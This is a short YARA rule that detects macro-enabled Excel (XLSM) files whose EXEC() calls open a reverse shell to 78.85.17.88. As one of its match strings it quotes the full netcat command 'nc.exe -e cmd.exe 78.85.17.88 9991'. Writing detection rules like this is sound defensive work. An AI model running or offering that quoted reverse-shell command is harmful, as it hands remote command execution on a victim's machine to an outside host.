rule russian_cobalt_strike_reverse_shell_in_xlsm_files {
  meta: 
    Description = "Detects EXEC() calls in Office files (XLSM) involving reverse connections to 78.85.17.88"
    Author = "Twitch/notdankenoughq - Github/M-Faheem-Khan"
    date = "August 13, 2022"
  strings: 
    $xlsm_file_header = { 50 4b }
    $content_type_xml = { 5b 43 6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d 6c }
    $exec_function = "EXEC("
    $exec_function_call = "EXEC(\"nc.exe -e cmd.exe 78.85.17.88 9991\""
    $malicious_ip = "78.85.17.88"
    
  condition:
    all of them
}